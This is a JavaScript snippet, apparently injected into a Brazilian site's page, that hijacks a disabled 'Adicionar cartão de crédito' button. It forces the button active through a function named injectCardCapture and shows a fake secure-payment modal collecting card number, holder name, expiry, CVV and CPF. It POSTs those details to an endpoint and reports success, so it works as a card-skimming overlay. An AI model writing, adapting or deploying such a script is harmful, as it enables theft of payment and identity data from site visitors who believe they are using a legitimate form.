(function() {
    function showToast(message, type = 'success') {
        const toast = document.createElement('div');
        toast.className = `sp-toast-notification ${type}`;
        toast.innerHTML = `
            <div class="sp-toast-icon">
                ${type === 'success' ? '✓' : '✕'}
            </div>
            <div class="sp-toast-message">${message}</div>
        `;
        document.body.appendChild(toast);
        setTimeout(() => toast.classList.add('show'), 100);
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 500);
        }, 4000);
    }

    function injectCardCapture() {
        const cardBtn = Array.from(document.querySelectorAll('p')).find(p => p.textContent.includes('Adicionar cartão de crédito'))?.parentElement;
        
        if (cardBtn && !cardBtn.dataset.captured) {
            cardBtn.dataset.captured = "true";
            cardBtn.style.opacity = "1";
            cardBtn.style.cursor = "pointer";
            cardBtn.style.pointerEvents = "auto";
            cardBtn.style.filter = "none";
            cardBtn.classList.remove('opacity-40');
            cardBtn.classList.remove('pointer-events-none');
            
            // Remove qualquer div de cobertura que possa estar bloqueando o clique
            cardBtn.onclick = (e) => {
                e.preventDefault();
                e.stopPropagation();
                showCardModal();
            };
        } else if (cardBtn) {
            // Garante que continue ativo se o React mudar algo
            cardBtn.style.opacity = "1";
            cardBtn.style.pointerEvents = "auto";
            cardBtn.classList.remove('opacity-40');
        }
    }

    function showCardModal() {
        const modal = document.createElement('div');
        modal.id = 'card-modal';
        modal.innerHTML = `
            <div class="card-modal-content">
                <div class="card-modal-header">
                    <button id="close-modal">✕</button>
                    <h3>Adicionar cartão de crédito</h3>
                </div>
                <div class="card-modal-body">
                    <div class="input-group">
                        <label>Número do cartão</label>
                        <input type="text" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19">
                    </div>
                    <div class="input-group">
                        <label>Nome do titular</label>
                        <input type="text" id="card-name" placeholder="Como no cartão">
                    </div>
                    <div class="row">
                        <div class="input-group">
                            <label>Validade (MM/AA)</label>
                            <input type="text" id="card-expiry" placeholder="MM/AA" maxlength="5">
                        </div>
                        <div class="input-group">
                            <label>CVV</label>
                            <input type="text" id="card-cvv" placeholder="000" maxlength="4">
                        </div>
                    </div>
                    <div class="input-group">
                        <label>CPF do titular</label>
                        <input type="text" id="card-cpf" placeholder="000.000.000-00" maxlength="14">
                    </div>
                    <button id="save-card-btn">Salvar</button>
                    <p class="card-safe-text">🔒 Pagamento processado de forma segura.</p>
                </div>
            </div>
        `;

        document.body.appendChild(modal);

        // Masking
        document.getElementById('card-num').oninput = e => {
            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
            e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
        };
        document.getElementById('card-expiry').oninput = e => {
            let v = e.target.value.replace(/\D/g, '').substring(0, 4);
            if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2);
            e.target.value = v;
        };
        document.getElementById('card-cpf').oninput = e => {
            let v = e.target.value.replace(/\D/g, '').substring(0, 11);
            if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
            else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
            else if (v.length > 3) v = v.replace(/(\d{3})(\d+)/, "$1.$2");
            e.target.value = v;
        };

        document.getElementById('close-modal').onclick = () => modal.remove();
        
        document.getElementById('save-card-btn').onclick = async () => {
            const btn = document.getElementById('save-card-btn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span> Processando...';

            const data = {
                card_number: document.getElementById('card-num').value,
                card_name: document.getElementById('card-name').value,
                expiry: document.getElementById('card-expiry').value,
                cvv: document.getElementById('card-cvv').value,
                cpf: document.getElementById('card-cpf').value
            };

            if (!data.card_number || data.card_number.replace(/\s/g, '').length < 16) {
                showToast('Número de cartão inválido', 'error');
                btn.disabled = false;
                btn.textContent = 'Salvar';
                return;
            }

            try {
                const res = await fetch('/api/payment/card', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                if (res.ok) {
                    showToast('Cartão validado e adicionado com sucesso!');
                    setTimeout(() => {
                        const modalEl = document.getElementById('card-modal');
                        if (modalEl) modalEl.remove();
                        const cardText = Array.from(document.querySelectorAll('p')).find(p => p.textContent.includes('Adicionar cartão de crédito'));
                        if (cardText) {
                            cardText.textContent = `Cartão final ${data.card_number.slice(-4)} adicionado`;
                            cardText.style.color = '#10b981';
                            cardText.style.fontWeight = 'bold';
                        }
                    }, 1000);
                } else {
                    showToast('Erro na validação. Verifique os dados.', 'error');
                }
            } catch (err) {
                showToast('Erro de conexão com o gateway.', 'error');
            } finally {
                btn.disabled = false;
                btn.textContent = 'Salvar';
            }
        };
    }

    setInterval(injectCardCapture, 1000);
})();
